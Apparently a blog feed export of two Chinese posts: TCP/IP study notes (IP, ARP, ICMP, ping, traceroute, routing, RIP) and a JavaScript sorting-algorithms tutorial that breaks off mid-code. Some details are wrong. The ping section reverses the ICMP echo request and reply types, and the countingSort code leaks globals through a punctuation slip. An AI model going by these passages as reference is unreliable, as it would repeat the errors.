一些基本的常识在学习协议之前，我们应该具备一些基本知识。 互联网地址(ip地址)网络上每一个节点都必须有一个独立的Internet地址（也叫做IP地址）。现在，通常使用的IP地址是一个32bit的数字，也就是我们常说的IPv4标准，这32bit的数字分成四组，也就是常见的255.255.255.255的样式。IPv4标准上，地址被分为五类，我们常用的是B类地址。具体的分类请参考其他文档。需要注意的是IP地址是网络号+主机号的组合，这非常重要。 域名系统域名系统是一个分布的数据库，它提供将主机名（就是网址啦）转换成IP地址的服务。 RFCRFC是什么？RFC就是tcp/ip协议的标准文档，在这里我们可以看到RFC那长长的定义列表，现在它一共有4000多个协议的定义，当然，我们所要学习的，也就是那么十几个协议而已。 端口号(port)注意，这个号码是用在TCP，UDP上的一个逻辑号码，并不是一个硬件端口，我们平时说把某某端口封掉了，也只是在IP层次把带有这个号码的IP包给过滤掉了而已。 应用编程接口现在常用的编程接口有socket和TLI。而前面的有时候也叫做“Berkeley socket”，可见Berkeley对于网络的发展有多大的贡献。 TCP/IP详解学习笔记(2)-数据链路层数据链路层有三个目的：1.为IP模块发送和 接收IP数据报。2.为ARP模块发送ARP请求和接收ARP应答。3.为RARP发送RARP请 求和接收RARP应答ip大家都听说过。至于ARP和RARP，ARP叫做地址解析协议，是用IP地址换MAC地址的一种协议，而RARP则叫做逆地址解析协议，在tcp/ip协议的后面章节会介绍它们（在局域网里面用ARP协议可以很容易的搞瘫痪网络哦）数据链路层的协议还是很多的，有我们最常用的以太网（就是平时我们用的网卡）协议，也有不太常见的令牌环，还有FDDI，当然，还有国内现在相当普及的PPP协议（就是adsl宽带），以及一个loopback协议。联系linux里面的ifconfig -a命令，这个命令通常会得到如下的结果 eth0 Link encap:Ethernet HWaddr 00:01:4A:03:5B:ED inet addr:192.168.11.2 Bcast:192.168.11.255 Mask:255.255.255.0 inet6 addr: fe80::201:4aff:fe03:5bed/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:2819 errors:0 dropped:0 overruns:0 frame:0 TX packets:76 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:241609 (235.9 KiB) TX bytes:9596 (9.3 KiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:2713 errors:0 dropped:0 overruns:0 frame:0 TX packets:2713 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:3516032 (3.3 MiB) TX bytes:3516032 (3.3 MiB) 其中，eth0就是以太网接口，而lo则是loopback接口。这也说明这个主机在网络链路层上至少支持loopback协议和以太网协议。以太网（Ether-net）的定是指数字设备公司（ Digital Equipment Corp.）、英特尔公司（Intel Corp.）和Xerox公司在1982年联合公布的一个标准，这个标准里面使用了一种称作CSMA/CD的接入方法。而IEEE802提供的标准集802.3(还有一部分定义到了802.2中)也提供了一个CSMA/CD的标准。这两个标准稍有不同，TCP/IP协议对这种情况的处理方式如下: 1.以太网的IP数据报封装在RFC894中定义，而IEEE802网络的IP数据报封装在RFC1042中定义。2.一台主机一定要能发送和接收RFC894定义的数据报。3.一台主机可以接收RFC894和RFC1042的封装格式的混合数据报。4.一台主机也许能够发送RFC1042数据报。。如果主机能同时发送两种类型的分组数 据，那么发送的分组必须是可以设置的，而且默认条件下必须是RFC 894分组。 可见，RFC1042在TCP/IP里面处于一个配角的地位。这两种不同的数据报格式请参考教材。ppp(点对点协议)是从SLIP的替代品。他们都提供了一种低速接入的解决方案。而每一种数据链路层协议，都有一个MTU（最大传输单元）定义，在这个定义下面，如果IP数据报过大，则要进行分片(fragmentation)，使得每片都小于MTU，注意PPP的MTU并不是一个物理定义，而是指一个逻辑定义（个人认为就是用程序控制）。可以用netstat来打印出MTU的结果，比如键入netstat -inKernel Interface table Iface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg eth0 1500 0 1774 0 0 0 587 0 0 0 BMRU lo 16436 0 2667 0 0 0 2667 0 0 0 LRU就可以观察到eth0的MTU是1500。而lo（环回接口）的MTU则是16436。最后说说那个环回接口（loopback）。平时我们用127.0.0.1来尝试自己的机器服务器好使不好使。走的就是这个loopback接口。对于环回接口，有如下三点值得注意:1.传给环回地址（一般是127.0.0.1）的任何数据均作为I P输入。2.传给广播地址或多播地址的数据报复制一份传给环回接口，然后送到以太网上。这是 因为广播传送和多播传送的定义包含主机本身。3.任何传给该主机IP地址的数据均送到环回接口。这一章还是很简单的，一般作为了解知识也就足够了，没必要抠的那么详细。 TCP/IP详解之IP协议ARP协议和RARP协议把这三个协议放到一起学习是因为这三个协议处于同一层，ARP协议用来找到目标主机的Ethernet网卡Mac地址，IP则承载要发送的消息。数据链路层可以从ARP得到数据的传送信息，而从IP得到要传输的数据信息。 1.IP协议IP协议是TCP/IP协议的核心，所有的TCP，UDP，IMCP，IGCP的数据都以IP数据格式传输。要注意的是，IP不是可靠的协议，这是说，IP协议没有提供一种数据未传达以后的处理机制–这被认为是上层协议–TCP或UDP要做的事情。所以这也就出现了TCP是一个可靠的协议，而UDP就没有那么可靠的区别。这是后话，暂且不提 1.1.IP协议头挨个解释它是教科书的活计，我感兴趣的只是那八位的TTL字段，还记得这个字段是做什么的么?这个字段规定该数据包在穿过多少个路由之后才会被抛弃(这里就体现出来IP协议包的不可靠性，它不保证数据被送达)，某个ip数据包每穿过一个路由器，该数据包的TTL数值就会减少1，当该数据包的TTL成为零，它就会被自动抛弃。这个字段的最大值也就是255，也就是说一个协议包也就在路由器里面穿行255次就会被抛弃了，根据系统的不同，这个数字也不一样，一般是32或者是64，Tracerouter这个工具就是用这个原理工作的，tranceroute的-m选项要求最大值是255，也就是因为这个TTL在IP协议里面只有8bit。现在的ip版本号是4，所以也称作IPv4。现在还有IPv6，而且运用也越来越广泛了。 1.2.IP路由选择当一个IP数据包准备好了的时候，IP数据包(或者说是路由器)是如何将数据包送到目的地的呢?它是怎么选择一个合适的路径来”送货”的呢?最特殊的情况是目的主机和主机直连，那么主机根本不用寻找路由，直接把数据传递过去就可以了。至于是怎么直接传递的，这就要靠ARP协议了，后面会讲到。稍微一般一点的情况是，主机通过若干个路由器(router)和目的主机连接。那么路由器就要通过ip包的信息来为ip包寻找到一个合适的目标来进行传递，比如合适的主机，或者合适的路由。路由器或者主机将会用如下的方式来处理某一个IP数据包如果IP数据包的TTL(生命周期)以到，则该IP数据包就被抛弃。搜索路由表，优先搜索匹配主机，如果能找到和IP地址完全一致的目标主机，则将该包发向目标主机搜索路由表，如果匹配主机失败，则匹配同子网的路由器，这需要“子网掩码(1.3.)”的协助。如果找到路由器，则将该包发向路由器。搜索路由表，如果匹配同子网路由器失败，则匹配同网号(第一章有讲解)路由器，如果找到路由器，则将该包发向路由器。搜索陆游表，如果以上都失败了，就搜索默认路由，如果默认路由存在，则发包如果都失败了，就丢掉这个包。这再一次证明了，ip包是不可靠的。因为它不保证送达。 1.3.子网寻址IP地址的定义是网络号+主机号。但是现在所有的主机都要求子网编址，也就是说，把主机号在细分成子网号+主机号。最终一个IP地址就成为 网络号码+子网号+主机号。例如一个B类地址：210.30.109.134。一般情况下，这个IP地址的红色部分就是网络号，而蓝色部分就是子网号，绿色部分就是主机号。至于有多少位代表子网号这个问题上，这没有一个硬性的规定，取而代之的则是子网掩码，校园网相信大多数人都用过，在校园网的设定里面有一个255.255.255.0的东西，这就是子网掩码。子网掩码是由32bit的二进制数字序列,形式为是一连串的1和一连串的0，例如：255.255.255.0(二进制就是11111111.11111111.11111111.00000000)对于刚才的那个B类地址，因为210.30是网络号，那么后面的109.134就是子网号和主机号的组合，又因为子网掩码只有后八bit为0，所以主机号就是IP地址的后八个bit，就是134，而剩下的就是子网号码–109。 2. ARP协议还记得数据链路层的以太网的协议中，每一个数据包都有一个MAC地址头么?我们知道每一块以太网卡都有一个MAC地址，这个地址是唯一的，那么IP包是如何知道这个MAC地址的?这就是ARP协议的工作。ARP(地址解析)协议是一种解析协议，本来主机是完全不知道这个IP对应的是哪个主机的哪个接口，当主机要发送一个IP包的时候，会首先查一下自己的ARP高速缓存(就是一个IP-MAC地址对应表缓存)，如果查询的IP-MAC值对不存在，那么主机就向网络发送一个ARP协议广播包，这个广播包里面就有待查询的IP地址，而直接收到这份广播的包的所有主机都会查询自己的IP地址，如果收到广播包的某一个主机发现自己符合条件，那么就准备好一个包含自己的MAC地址的ARP包传送给发送ARP广播的主机，而广播主机拿到ARP包后会更新自己的ARP缓存(就是存放IP-MAC对应表的地方)。发送广播的主机就会用新的ARP缓存数据准备好数据链路层的的数据包发送工作。一个典型的arp缓存信息如下，在任意一个系统里面用“arp -a”命令: Interface: 192.168.11.3 --- 0x2&lt;br&gt; Internet Address Physical Address Type&lt;br&gt; 192.168.11.1 00-0d-0b-43-a0-2e dynamic 192.168.11.2 00-01-4a-03-5b-ed dynamic都会得到这样的结果。这样的高速缓存是有时限的，一般是20分钟(伯克利系统的衍生系统)。 TCP/IP详解学习笔记(4)-ICMP协议，ping和Traceroute1.IMCP协议介绍前面讲到了，IP协议并不是一个可靠的协议，它不保证数据被送达，那么，自然的，保证数据送达的工作应该由其他的模块来完成。其中一个重要的模块就是ICMP(网络控制报文)协议。当传送IP数据包发生错误－－比如主机不可达，路由不可达等等，ICMP协议将会把错误信息封包，然后传送回给主机。给主机一个处理错误的机会，这 也就是为什么说建立在IP层以上的协议是可能做到安全的原因。ICMP数据包由8bit的错误类型和8bit的代码和16bit的校验和组成。而前 16bit就组成了ICMP所要传递的信息。书上的图6－3清楚的给出了错误类型和代码的组合代表的意思。尽管在大多数情况下，错误的包传送应该给出ICMP报文，但是在特殊情况下，是不产生ICMP错误报文的。如下1.ICMP差错报文不会产生ICMP差错报文（出IMCP查询报文）（防止IMCP的无限产生和传送）2.目的地址是广播地址或多播地址的IP数据报。3.作为链路层广播的数据报。4.不是IP分片的第一片。5.源地址不是单个主机的数据报。这就是说，源地址不能为零地址、环回地址、广播地 址或多播地址。虽然里面的一些规定现在还不是很明白，但是所有的这一切规定，都是为了防止产生ICMP报文的无限传播而定义的。ICMP协议大致分为两类，一种是查询报文，一种是差错报文。其中查询报文有以下几种用途:1.ping查询（不要告诉我你不知道ping程序）2.子网掩码查询（用于无盘工作站在初始化自身的时候初始化子网掩码）3.时间戳查询（可以用来同步时间） 而差错报文则产生在数据传送发生错误的时候。就不赘述了。 2.ICMP的应用–pingping可以说是ICMP的最著名的应用，当我们某一个网站上不去的时候。通常会ping一下这个网站。ping会回显出一些有用的信息。一般的信息如下:Reply from 10.4.24.1: bytes=32 timeReply from 10.4.24.1: bytes=32 timeReply from 10.4.24.1: bytes=32 timeReply from 10.4.24.1: bytes=32 timePing statistics for 10.4.24.1: Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),Approximate round trip times in milli-seconds: Minimum = 0ms, Maximum = 0ms, Average = 0msping这个单词源自声纳定位，而这个程序的作用也确实如此，它利用ICMP协议包来侦测另一个主机是否可达。原理是用类型码为0的ICMP发请 求，受到请求的主机则用类型码为8的ICMP回应。ping程序来计算间隔时间，并计算有多少个包被送达。用户就可以判断网络大致的情况。我们可以看到， ping给出来了传送的时间和TTL的数据。我给的例子不太好，因为走的路由少，有兴趣地可以ping一下国外的网站比如sf.net，就可以观察到一些 丢包的现象，而程序运行的时间也会更加的长。ping还给我们一个看主机到目的主机的路由的机会。这是因为，ICMP的ping请求数据报在每经过一个路由器的时候，路由器都会把自己的ip放到该数 据报中。而目的主机则会把这个ip列表复制到回应icmp数据包中发回给主机。但是，无论如何，ip头所能纪录的路由列表是非常的有限。如果要观察路由， 我们还是需要使用更好的工具，就是要讲到的Traceroute(windows下面的名字叫做tracert)。 3.ICMP的应用–TracerouteTraceroute是用来侦测主机到目的主机之间所经路由情况的重要工具，也是最便利的工具。前面说到，尽管ping工具也可以进行侦测，但是，因为ip头的限制，ping不能完全的记录下所经过的路由器。所以Traceroute正好就填补了这个缺憾。Traceroute的原理是非常非常的有意思，它受到目的主机的IP后，首先给目的主机发送一个TTL=1（还记得TTL是什么吗？）的UDP(后面就 知道UDP是什么了)数据包，而经过的第一个路由器收到这个数据包以后，就自动把TTL减1，而TTL变为0以后，路由器就把这个包给抛弃了，并同时产生 一个主机不可达的ICMP数据报给主机。主机收到这个数据报以后再发一个TTL=2的UDP数据报给目的主机，然后刺激第二个路由器给主机发ICMP数据 报。如此往复直到到达目的主机。这样，traceroute就拿到了所有的路由器ip。从而避开了ip头只能记录有限路由IP的问题。有人要问，我怎么知道UDP到没到达目的主机呢？这就涉及一个技巧的问题，TCP和UDP协议有一个端口号定义，而普通的网络程序只监控少数的几个号码较 小的端口，比如说80,比如说23,等等。而traceroute发送的是端口号&gt;30000(真变态)的UDP报，所以到达目的主机的时候，目的 主机只能发送一个端口不可达的ICMP数据报给主机。主机接到这个报告以后就知道，主机到了，所以，说Traceroute是一个骗子一点也不为过:)Traceroute程序里面提供了一些很有用的选项，甚至包含了IP选路的选项，请察看man文档来了解这些，这里就不赘述了。 TCP/IP详解学习笔记(5)-IP选路，动态选路，和一些细节1.静态IP选路1.1.一个简单的路由表选路是IP层最重要的一个功能之一。前面的部分已经简单的讲过路由器是通过何种规则来根据IP数据包的IP地址来选择路由。这里就不重复了。首先来看看一个简单的系统路由表。Destination Gateway Genmask Flags Metric Ref Use Iface192.168.11.0 255.255.255.0 U 0 0 0 eth0169.254.0.0 255.255.0.0 U 0 0 0 eth0default 192.168.11.1 0.0.0.0 UG 0 0 0 eth0对于一个给定的路由器，可以打印出五种不同的flag。1.U表明该路由可用。2.G表明该路由是到一个网关。如果没有这个标志，说明和Destination是直连的，而相应的Gateway应该直接给出Destination的地址。3.H表明该路由是到一个主机，如果没有该标志，说明Destination是一个网络，换句话说Destination就应该写成一个网络号和子网号的组合，而不包括主机号(主机号码处为0)，例如 192.168.11.04.D表明该路由是为重定向报文创建的5.M该路由已经被重定向报文修改 U没啥可说的，G说明这是一个网关，如果你要发数据给Destination，IP头应该写Destination的IP地址，而数据链路层的MAC地址就应该是GateWay的Mac地址了；反之，如果没有G标志，那么数据链路层和IP层的地址应该是对应的。H说明了Destination的性质，如果是H的，则说明该地址是一个完整的地址，既有网络号又有主机号，那么再匹配的时候就既要匹配网络号，又要匹配主机号；反之，Destination就代表一个网络，在匹配的时候只要匹配一下网络号就可以了。这样，IP选路的方式就可以更加具体化了。如下1.首先用IP地址来匹配那些带H标志的DestinationIP地址。2.如果1失败就匹配那些网络地址。3.如果2失败就发送到Default网关 顺便提一下那个GenMask（还记得子网掩码么），它指定了目的地址的子网号，例如第一条的子网就是11。 1.2.其他有关路由表的知识一般，我们在配置好一个网络接口的时候，一个路由就被直接创建好了。当然我们也可以手动添加路由。用route add命令就可以了。而当一个IP包在某一个路由器的时候发现没有路由可走，那么该路由器就会给源主机发送“主机不可达”或者“网络不可达”的ICMP包来报错。注意，一般的操作系统默认是没有路由功能的，这需要自己配置。这些历史原因就不细说了。 1.3.ICMP的IP重定向报文和路由发现报文当IP包在某一个地方转向的时候，都回给发送IP报的源主机一个ICMP重定向报文，而源主机就可以利用这个信息来更新自己的路由表，这样，随着网络通信的逐渐增多，路由表也就越来越完备，数据转发的速度也会越来越快。我们需要注意的是：1.重定向报文只能由路由器发出。2.重定向报文为主机所用，而不是为路由器所用。 在主机引导的时候，一般会发送在网内广播一个路由请求的ICMP报文，而多个路由器则会回应一个路由通告报文。而且，路由其本身不定期的在网络内发布路由通告报文，这样，根据这些报文，每一个主机都会有机会建立自己的路由表而实现网络通信。路由器在一份通告报文中可以通告多个地址，并且给出每一个地址的优先等级，这个优先等级是该IP作为默认路由的等级，至于怎么算的就不深究了。路由器一般会在450-600秒的时间间隔内发布一次通告，而一个给定的通告报文的寿命是30分钟。而主机在引导的时候会每三秒发送一次请求报文，一旦接受到一个有效的通告报文，就停止发送请求报文。在TCP/IP详解编写的时候，只有Solaris2.x支持这两种报文，大多数系统还不支持这两种报文。（后面还会讲到一些有用的路由报文） 2.动态选路协议前面的选路方法叫做静态选路，简要地说就是在配置接口的时候，以默认的方式生成路由表项。并通过route来增加表项，或者通过ICMP报文来更新表项（通常在默认方式出错的情况下）。 而如果上诉三种方法都不能满足，那么我们就使用动态选路。动态选路协议是用于动态选路的重要组成部分，但是他们只是使用在路由器之间，相邻路由器之间互相通信。系统（路有选择程序）选择比较合适的路有放到核心路由表中，然后系统就可以根据这个核心路有表找到最合适的网路。也就是说，动态选路是在系统核心网络外部进行的，它只是用一些选路的策略影响路由表，而不会影响到最后通过路由表选择路由的那一部分。选路协议有一大类常用的叫做内部网关协议(IGP)，而在IGP中，RIP就是其中最重要的协议。一种新的IGP协议叫做开放最短路经优先(OSPF)协议，其意在取代RIP。另一种最早用在网路骨干网上的IGP协议–HELLO，现在已经不用了。如今，任何支持动态选路的路由器都必须同时支持OSPF和RIP，还可以选择性的支持其他的IGP协议。 2.1.Unix选路程序Unix系统上面通常都有路由守护程序－－routed。还有一个叫做gate。gate所支持的协议要比routed多，routed只是支持RIPv1版本。而gate则支持RIPv1、v2，BGPv1 等等。 2.1.RIP：选路信息协议它的定义可以在RFC1058内找到，这种协议使用UDP作为载体（也就是UDP的上层协议）。我们最关心的就是RIP其中的一个段，叫做度量的段，这是一个以hop作为计数器（就是以走过多少路由为计数器）的段（IP协议里面也有一个TTL不是么）。这个度量段将最终影响到路由表的建立。参考图:一般说来routed要承担如下的工作：1.给每一个已知的路由器发送rip请求报文，要求其他路由器给出完整的路由表。这种报文的命令字段为1，地址字段为0，度量地段为16（相当于无穷大）。2.接受请求，如果接收到刚才的那个请求，就把自己的完整的路由表交给请求者。如果没有，就处理IP请求表项，把表项中自己有的部分添上跳数，没有的部分添上16。然后发给请求者。3.接受回应。更新自己的路由表。使用hop数小的规则。4.定期更新路由表，一般是30s(真频繁)给相邻的路有启发一次自己的路由表。这种形式可以使广播形式的。这个协议看起来会工作的很好，但是，这里面其实有很多隐藏的忧患，比如说RIP没有子网的概念，比如说环路的危险。而且hop数的上限也限制了网络的大小。因此，出现了很多RIPv1的替代品，比如说RIPv2,比如说OSPF。他们都是通过某种策略来影响路由表，所以就不说了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS家的排序算法🎵]]></title>
      <url>%2F2016%2F03%2F25%2F15%2F</url>
      <content type="text"><![CDATA[引子有句话怎么说来着：雷锋推倒雷峰塔，Java implements JavaScript.当年，想凭借抱Java大腿火一把而不惜把自己名字给改了的JavaScript（原名LiveScript），如今早已光芒万丈。node JS的出现更是让JavaScript可以前后端通吃。虽然Java依然制霸企业级软件开发领域（C/C + +的大神们不要打我。。。），但在Web的江湖，JavaScript可谓风头无两，坐上了头把交椅。然而，在传统的计算机算法和数据结构领域，大多数专业教材和书籍的默认语言都是Java或者C/C+ +。这给最近想恶补算法和数据结构知识的我造成了一定困扰，因为我想寻找一本以JavaScript为默认语言的算法书籍。当我了解到O’REILLY家的动物丛书系列里有一本叫做《数据结构与算法JavaScript描述》时，便兴奋的花了两天时间把这本书从头到尾读了一遍。它是一本很好的针对前端开发者们的入门算法书籍，可是，它有一个很大的缺陷，就是里面有很多明显的小错误，明显到就连我这种半路出家的程序猿都能一眼看出来。还有一个问题是，很多重要的算法和数据结构知识并没有在这本书里被提到。这些问题对于作为一个晚期强迫症患者的我来说简直不能忍。于是乎，一言不合我就决定自己找资料总结算法。那么，我就从算法领域里最基础的知识点——排序算法总结起好了。我相信以下的代码里一定会有某些bug或错误或语法不规范等问题是我自己无法发现的，所以敬请各位大神能够指出错误，因为只有在不断改错的道路上我才能取得长久的进步。 十大经典算法排序总结对比一张图概括：主流排序算法概览 名词解释：n: 数据规模k: “桶”的个数In-place: 占用常数内存，不占用额外内存Out-place: 占用额外内存稳定性：排序后2个相等键值的顺序和排序之前它们的顺序相同 冒泡排序（Bubble Sort）冒泡排序须知：作为最简单的排序算法之一，冒泡排序给我的感觉就像Abandon在单词书里出现的感觉一样，每次都在第一页第一位，所以最熟悉。。。冒泡排序还有一种优化算法，就是立一个flag，当在一趟序列遍历中元素没有发生交换，则证明该序列已经有序。但这种改进对于提升性能来说并没有什么太大作用。。。 什么时候最快（Best Cases）：当输入的数据已经是正序时（都已经是正序了，我还要你冒泡排序有何用啊。。。。） 什么时候最慢（Worst Cases）：当输入的数据是反序时（写一个for循环反序输出数据不就行了，干嘛要用你冒泡排序呢，我是闲的吗。。。） 冒泡排序动图演示： 冒泡排序JavaScript代码实现：function bubbleSort(arr) { var len = arr.length; for (var i = 0; i &lt; len; i++) { for (var j = 0; j &lt; len - 1 - i; j++) { if (arr[j] &gt; arr[j+1]) { //相邻元素两两对比 var temp = arr[j+1]; //元素交换 arr[j+1] = arr[j]; arr[j] = temp; } } } return arr; } 选择排序（Selection Sort）选择排序须知：在时间复杂度上表现最稳定的排序算法之一，因为无论什么数据进去都是O(n²)的时间复杂度。。。所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。 选择排序动图演示：Selection Sort 动图演示 算法可视化来源：http://visualgo.net/“ 插入排序（Insertion Sort）插入排序须知：插入排序的代码实现虽然没有冒泡排序和选择排序那么简单粗暴，但它的原理应该是最容易理解的了，因为只要打过扑克牌的人都应该能够秒懂。当然，如果你说你打扑克牌摸牌的时候从来不按牌的大小整理牌，那估计这辈子你对插入排序的算法都不会产生任何兴趣了。。。插入排序和冒泡排序一样，也有一种优化算法，叫做拆半插入。对于这种算法，得了懒癌的我就套用教科书上的一句经典的话吧：感兴趣的同学可以在课后自行研究。。。 插入排序动图演示： 插入排序JavaScript代码实现：function insertionSort(arr) { var len = arr.length; var preIndex, current; for (var i = 1; i &lt; len; i++) { preIndex = i - 1; current = arr[i]; while(preIndex &gt;= 0 &amp;&amp; arr[preIndex] &gt; current) { arr[preIndex+1] = arr[preIndex]; preIndex--; } arr[preIndex+1] = current; } return arr; } 希尔排序（Shell Sort）希尔排序须知：希尔排序是插入排序的一种更高效率的实现。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版》的合著者Robert Sedgewick提出的。在这里，我就使用了这种方法。 希尔排序JavaScript代码实现：function shellSort(arr) { var len = arr.length, temp, gap = 1; while(gap &lt; len/3) { //动态定义间隔序列 gap =gap*3+1; } for (gap; gap &gt; 0; gap = Math.floor(gap/3)) { for (var i = gap; i &lt; len; i++) { temp = arr[i]; for (var j = i-gap; j &gt;= 0 &amp;&amp; arr[j] &gt; temp; j-=gap) { arr[j+gap] = arr[j]; } arr[j+gap] = temp; } } return arr; } 归并排序（Merge Sort）归并排序须知：作为一种典型的分而治之思想的算法应用，归并排序的实现由两种方法： 1.自上而下的递归（所有递归的方法都可以用迭代重写，所以就有了第2种方法）2.自下而上的迭代在《数据结构与算法JavaScript描述》中，作者给出了自下而上的迭代方法。但是对于递归法，作者却认为：However, it is not possible to do so in JavaScript, as the recursion goes too deep for the language to handle.然而,在 JavaScript 中这种方式不太可行,因为这个算法的递归深度对它来讲太深了。 &lt;br&gt;更新：在《JavaScript语言精粹》的第四章里提到了递归问题。对我之前的疑问进行了解答：Some languages offer the tail recursion optimization. This means that if a function returns the result of invoking itself recursively, then the invocation is replaced with a loop, which can significantly speed things up. Unfortunately, JavaScript does not currently provide tail recursion optimization. Functions that recurse very deeply can fail by exhausting the return stack.一些语言提供了尾递归优化。这意味着如果一个函数返回自身递归调用的结果，那么调用的过程会被替换为一个循环，它可以显著提高速度。遗憾的是，JavaScript当前并没有提供尾递归优化。深度递归的函数可能会因为堆栈溢出而运行失败。再次更新：好消息！好消息！ES6已经添加了对尾递归优化的支持，妈妈再也不用担心我用JavaScript写递归了。不过，需要注意的是，ES6的尾递归优化只在严格模式下才会开启。这样规定的原因在阮一峰的《ECMAScript6 入门》里解释得很清楚： 正常模式下，函数内部有两个变量，可以跟踪函数的调用栈。 func.arguments：返回调用时函数的参数。 func.caller：返回调用当前函数的那个函数。 尾调用优化发生时，函数的调用栈会改写，因此上面两个变量就会失真。严格模式禁用这两个变量，所以尾调用模式仅在严格模式下生效。 和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(n log n）的时间复杂度。代价是需要额外的内存空间。 归并排序动图演示：Merge Sort 动图演示 算法可视化来源：http://visualgo.net/ 归并排序JavaScript代码实现：function mergeSort(arr) { //采用自上而下的递归方法 var len = arr.length; if(len &lt; 2) { return arr; } var middle = Math.floor(len / 2), left = arr.slice(0, middle), right = arr.slice(middle); return merge(mergeSort(left), mergeSort(right)); } function merge(left, right) { var result = []; while (left.length &amp;&amp; right.length) { if (left[0] &lt;= right[0]) { result.push(left.shift()); } else { result.push(right.shift()); } } while (left.length) result.push(left.shift()); while (right.length) result.push(right.shift()); return result; } 快速排序（Quick Sort）快速排序须知：又是一种分而治之思想在排序算法上的典型应用。本质上来看，快速排序应该算是在冒泡排序基础上的递归分治法。快速排序的名字起的是简单粗暴，因为一听到这个名字你就知道它存在的意义，就是快，而且效率高! 它是处理大数据最快的排序算法之一了。虽然Worst Case的时间复杂度达到了O(n²)，但是人家就是优秀，在大多数情况下都比平均时间复杂度为O(n log n) 的排序算法表现要更好，可是这是为什么呢，我也不知道。。。好在我的强迫症又犯了，查了N多资料终于在《算法艺术与信息学竞赛》上找到了满意的答案： 快速排序的最坏运行情况是O(n²)，比如说顺序数列的快排。但它的平摊期望时间是O(n log n) ，且O(n log n)记号中隐含的常数因子很小，比复杂度稳定等于O(n log n)的归并排序要小很多。所以，对绝大多数顺序性较弱的随机数列而言，快速排序总是优于归并排序。 更新：《算法 第四版》里对于快速排序的优缺点进行了更加明确的解释： 快速排序的内循环比大多数排序算法都要短小，这意味着它无论是在理论上还是在实际中都要更快。它的主要缺点是非常脆弱，在实现时要非常小心才能避免低劣的性能。 快速排序动图演示：Quick Sort 动图演示 算法可视化来源：http://visualgo.net/ 快速排序JavaScript代码实现：function quickSort(arr, left, right) { var len = arr.length, partitionIndex, left = typeof left != &apos;number&apos; ? 0 : left, right = typeof right != &apos;number&apos; ? len - 1 : right; if (left &lt; right) { partitionIndex = partition(arr, left, right); quickSort(arr, left, partitionIndex-1); quickSort(arr, partitionIndex+1, right); } return arr; } function partition(arr, left ,right) { //分区操作 var pivot = left, //设定基准值（pivot） index = pivot + 1; for (var i = index; i &lt;= right; i++) { if (arr[i] &lt; arr[pivot]) { swap(arr, i, index); index++; } } swap(arr, pivot, index - 1); return index-1; } function swap(arr, i, j) { var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } 堆排序（Heap Sort）堆排序须知：堆排序可以说是一种利用堆的概念来排序的选择排序。分为两种方法：1.大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列2.小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列 堆排序动图演示：Heap Sort 动图演示 算法可视化来源：http://www.ee.ryerson.ca/~courses/coe428/sorting/heapsort.html 堆排序JavaScript代码实现：var len; //因为声明的多个函数都需要数据长度，所以把len设置成为全局变量 function buildMaxHeap(arr) { //建立大顶堆 len = arr.length; for (var i = Math.floor(len/2); i &gt;= 0; i--) { heapify(arr, i); } } function heapify(arr, i) { //堆调整 var left = 2 * i + 1, right = 2 * i + 2, largest = i; if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) { largest = left; } if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) { largest = right; } if (largest != i) { swap(arr, i, largest); heapify(arr, largest); } } function swap(arr, i, j) { var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } function heapSort(arr) { buildMaxHeap(arr); for (var i = arr.length-1; i &gt; 0; i--) { swap(arr, 0, i); len--; heapify(arr, 0); } return arr; } 计数排序（Counting Sort）计数排序须知：计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。 计数排序动图演示：Counting Sort 动图演示 算法可视化来源：http://visualgo.net/ 计数排序JavaScript代码实现：function countingSort(arr, maxValue) { var bucket = new Array(maxValue+1), sortedIndex = 0; arrLen = arr.length, bucketLen = maxValue + 1; for (var i = 0; i &lt; arrLen; i++) { if (!bucket[arr[i]]) { bucket[arr[i]] = 0; } bucket[arr[i]]++; } for (var j = 0; j &lt; bucketLen; j++) { while(bucket[j] &gt; 0) { arr[sortedIndex++] = j; bucket[j]--; } } return arr; } 桶排序（Bucket Sort）桶排序须知：桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：1.在额外空间充足的情况下，尽量增大桶的数量2.使用的映射函数能够将输入的N个数据均匀的分配到K个桶中同时，对于桶中元素的排序，选择何种比较排序算法对于性能的影响至关重要。 什么时候最快（Best Cases）：当输入的数据可以均匀的分配到每一个桶中 什么时候最慢（Worst Cases）：当输入的数据被分配到了同一个桶中 桶排序JavaScript代码实现：function bucketSort(arr, bucketSize) { if (arr.length === 0) { return arr; } var i; var minValue = arr[0]; var maxValue = arr[0]; for (i = 1; i &lt; arr.length; i++) { if (arr[i] &lt; minValue) { minValue = arr[i]; //输入数据的最小值 } else if (arr[i] &gt; maxValue) { maxValue = arr[i]; //输入数据的最大值 } } //桶的初始化 var DEFAULT_BUCKET_SIZE = 5; //设置桶的默认数量为5 bucketSize = bucketSize || DEFAULT_BUCKET_SIZE; var bucketCount = Math.floor((maxValue - minValue) / bucketSize) + 1; var buckets = new Array(bucketCount); for (i = 0; i &lt; buckets.length; i++) { buckets[i] = []; } //利用映射函数将数据分配到各个桶中 for (i = 0; i &lt; arr.length; i++) { 